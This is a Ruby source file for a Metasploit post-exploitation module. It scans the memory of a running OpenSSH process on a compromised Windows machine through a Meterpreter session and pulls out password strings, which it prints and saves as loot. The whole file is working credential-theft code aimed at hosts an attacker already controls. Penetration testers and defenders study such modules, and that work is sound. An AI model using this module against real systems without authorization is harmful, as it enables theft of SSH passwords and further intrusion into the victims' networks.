##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows OpenSSH Password Search',
        'Description' => %q{
          This module allows for searching the memory space of running OpenSSH processes on Windows
          for potentially sensitive data such as passwords.
        },
        'License' => MSF_LICENSE,
        'Author' => ['sjanusz-r7'],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_sys_process_memory_search
            ]
          }
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
    register_options([
      OptInt.new('PID', [true, 'Process ID of OpenSSH to search through', nil]),
      OptString.new('REGEX', [true, 'Regular expression to search for with in memory', 'publickey,password.*']),
      OptInt.new('MIN_MATCH_LEN', [true, 'The minimum number of bytes to match', 5]),
      OptInt.new('MAX_MATCH_LEN', [true, 'The maximum number of bytes to match', 127]),
      OptBool.new('REPLACE_NON_PRINTABLE_BYTES', [true, 'Replace non-printable bytes with "."', true])
    ])
  end

  def pid
    datastore['PID']
  end

  def regex
    datastore['REGEX']
  end

  def min_match_len
    datastore['MIN_MATCH_LEN']
  end

  def max_match_len
    datastore['MAX_MATCH_LEN']
  end

  def replace_non_printable_bytes
    datastore['REPLACE_NON_PRINTABLE_BYTES']
  end

  def mem_search(pid, needle, min_search_len, match_len)
    request = ::Rex::Post::Meterpreter::Packet.create_request(::Rex::Post::Meterpreter::Extensions::Stdapi::COMMAND_ID_STDAPI_SYS_PROCESS_MEMORY_SEARCH)

    request.add_tlv(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_PID, pid)
    request.add_tlv(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_NEEDLE, needle)
    request.add_tlv(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_MATCH_LEN, match_len)
    request.add_tlv(::Rex::Post::Meterpreter::TLV_TYPE_UINT, min_search_len)

    session.send_request(request)
  end

  def non_printable?(byte)
    byte < 0x21 || byte > 0x7E
  end

  def print_results(results: [])
    if results.empty?
      print_status 'No regular expression matches were found in memory'
      return
    end

    results_table = ::Rex::Text::Table.new(
      'Header' => 'Memory Matches for OpenSSH',
      'Indent' => 1,
      'Columns' => ['Match Address', 'Match Length', 'Match Buffer', 'Memory Region Start', 'Memory Region Size']
    )

    x64_architectures = [
      ARCH_X64,
      ARCH_AARCH64
    ]
    address_length = x64_architectures.include?(session.native_arch) ? 16 : 8

    results.each do |result|
      match_address = result.get_tlv(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_MATCH_ADDR).value.to_s(16).upcase
      match_length = result.get_tlv(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_MATCH_LEN).value
      match_buffer = result.get_tlv(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_MATCH_STR).value
      region_start_address = result.get_tlv(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_START_ADDR).value.to_s(16).upcase
      region_start_size = result.get_tlv(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_SECT_LEN).value.to_s(16).upcase

      if replace_non_printable_bytes
        match_buffer = match_buffer.bytes.map { |byte| non_printable?(byte) ? '.' : byte.chr }.join
      end

      results_table << [
        "0x#{match_address.rjust(address_length, '0')}",
        match_length,
        match_buffer.inspect,
        "0x#{region_start_address.rjust(address_length, '0')}",
        "0x#{region_start_size.rjust(address_length, '0')}"
      ]
    end

    print_status results_table.to_s
  end

  def save_loot(results: [])
    results.each do |result|
      stored_loot = store_loot(
        'openssh.buffer',
        'bin',
        session,
        result.get_tlv_value(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_MATCH_STR),
        'openssh_buffer.bin',
        'OpenSSH Process Raw Memory Buffer'
      )
      print_good("Loot stored to: #{stored_loot}")
    end
  end

  def run
    if session.type != 'meterpreter'
      print_error 'Only Meterpreter sessions are supported by this post module'
      return
    end

    print_status("Running module against - #{session.info} (#{session.session_host}). This might take a few seconds...")
    results = mem_search(pid, regex, min_match_len, max_match_len)
    group_tlv_results = results.get_tlvs(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_RESULTS)
    print_results(results: group_tlv_results)
    save_loot(results: group_tlv_results)
  end
end
